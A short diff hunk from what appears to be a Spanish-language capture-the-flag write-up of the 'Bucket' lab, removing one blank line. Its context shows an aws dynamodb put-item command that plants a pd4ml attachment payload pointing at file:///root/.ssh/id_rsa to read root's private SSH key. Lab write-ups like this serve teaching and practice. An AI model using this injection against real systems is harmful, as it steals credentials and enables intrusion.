@@ -687,7 +687,6 @@ Perfectooooooooooooooooooo, tenemos la estructura del archivo `/etc/passwd` en n
 ```bash
 roy@bucket:/var/www/bucket-app/files$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
 --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}'
-
 {
     "ConsumedCapacity": {
         "TableName": "alerts",
